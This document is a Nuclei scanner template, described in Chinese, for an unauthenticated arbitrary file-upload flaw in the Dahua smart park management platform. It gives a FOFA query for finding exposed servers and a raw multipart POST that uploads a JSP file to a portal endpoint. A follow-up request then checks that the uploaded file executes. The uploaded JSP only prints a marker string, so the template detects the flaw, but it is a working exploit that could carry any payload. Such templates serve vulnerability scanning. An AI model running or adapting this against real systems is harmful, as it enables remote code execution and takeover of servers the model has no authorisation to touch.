id: dahua-smartpark-updatecab-upload
info:
  name: "大华智慧园区系统 updateOcx_updateCab.action 接口文件上传漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="dahua-智慧园区综合管理平台"
        大华智慧园区系统 updateOcx_updateCab.action 接口存在未授权文件上传缺陷，攻击者可通过构造恶意请求将任意文件上传至服务器，从而在目标系统中执行任意代码或篡改服务内容，造成系统控制权丧失及数据泄露风险。
        http://xx.xx.xx.xx/portal/ocx/{ 文件上传时间戳20240801102132}/NTest.jsp
  tags: 大华智慧园区系统

http:
- raw:
  - |
    POST /portal/updateOcx_updateZip.action HTTP/1.1
    Host: {{Hostname}}
    Accept-Encoding: identity
    Accept-Language: zh-CN,zh;q=0.8
    Accept: */*
    Accept-Charset: GBK,utf-8;q=0.7,*/*;q=0.3
    Connection: close
    Content-Type: multipart/form-data; boundary=9aa1b50e33144fb18837cc97ed863df7

    --9aa1b50e33144fb18837cc97ed863df7
    Content-Disposition: form-data; name="updateBean.compressFileName"

    NTest.jsp
    --9aa1b50e33144fb18837cc97ed863df7
    Content-Disposition: form-data; name="updateBean.compress"; filename="NTest.jsp"
    Content-Type: text/plain

    <% out.println("NdayTest"); %>
    --9aa1b50e33144fb18837cc97ed863df7--

  - |
    GET /NTest.jsp HTTP/1.1
    Host: {{Hostname}}

  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: body
    words:
    - "NdayTest"
